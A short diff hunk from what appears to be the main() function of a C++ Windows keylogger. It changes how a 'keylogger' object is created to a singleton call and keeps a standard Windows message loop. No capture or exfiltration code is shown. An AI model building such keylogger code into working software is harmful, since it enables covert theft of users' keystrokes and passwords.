@@ -2,7 +2,7 @@
 
 int main() {
 
-    keylogger keylogger;
+    keylogger::GetInstance();
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
